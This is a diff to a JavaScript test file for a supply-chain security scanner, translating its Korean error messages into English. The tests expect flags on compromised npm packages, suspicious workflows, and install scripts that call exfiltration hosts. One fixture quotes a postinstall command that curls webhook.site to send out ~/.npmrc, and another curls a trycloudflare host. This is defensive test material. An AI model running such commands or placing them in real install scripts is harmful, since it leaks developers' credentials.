@@ -45,9 +45,9 @@ test('blocked packages and blocked scopes in any lockfile fail, including nested
     }),
   });
   assert.equal(result.errors.length, 3);
-  assert.match(result.errors[0], /^frontend\/package-lock\.json: 침해 보고된 패키지 @ctrl\/tinycolor@4\.1\.1/);
+  assert.match(result.errors[0], /^frontend\/package-lock\.json: package reported as compromised @ctrl\/tinycolor@4\.1\.1/);
   assert.match(result.errors[1], /rxnt-authentication@0\.0\.3/);
-  assert.match(result.errors[2], /침해 보고된 스코프의 패키지 @nativescript-community\/ui@1\.0\.0/);
+  assert.match(result.errors[2], /package in a scope reported as compromised @nativescript-community\/ui@1\.0\.0/);
 });
 
 test('install scripts calling exfiltration hosts or dropped files fail; plain scripts do not', () => {
@@ -57,8 +57,8 @@ test('install scripts calling exfiltration hosts or dropped files fail; plain sc
     'node_modules/@scope/ok/package.json': { scripts: { build: 'node bundle.js' } },
   });
   assert.deepEqual(result.errors, [
-    'package.json: postinstall 스크립트가 외부 유출 의심 주소(webhook.site)를 호출합니다: curl https://webhook.site/abc -d @~/.npmrc',
-    'node_modules/evil: preinstall 스크립트가 의심 파일(bundle.js)을 실행합니다: node bundle.js',
+    'package.json: postinstall script calls a suspected exfiltration address (webhook.site): curl https://webhook.site/abc -d @~/.npmrc',
+    'node_modules/evil: preinstall script runs a suspicious file (bundle.js): node bundle.js',
   ]);
 });
 
@@ -68,14 +68,14 @@ test('suspicious workflow names and hosts in workflows fail', () => {
     '.github/workflows/ci.yml': 'run: curl https://x.trycloudflare.com\n',
   });
   assert.equal(result.errors.length, 2);
-  assert.ok(result.errors.some((e) => e.includes('침해 사례와 같은 이름')));
+  assert.ok(result.errors.some((e) => e.includes('workflow has the same name as a known compromise')));
   assert.ok(result.errors.some((e) => e.includes('trycloudflare')));
 });
 
 test('dependencies with install scripts are listed as a warning', () => {
   const result = scanFiles({ 'package-lock.json': lock({ 'node_modules/esbuild': { version: '0.25.0', hasInstallScript: true } }) });
   assert.deepEqual(result.errors, []);
-  assert.match(result.warnings[0], /설치 스크립트가 있는 의존성 1개.*esbuild@0\.25\.0/);
+  assert.match(result.warnings[0], /1 dependencies have install scripts.*esbuild@0\.25\.0/);
 });
 
 test('the vendored copy finds blocked-packages.json next to itself and exits 1 on findings', () => {
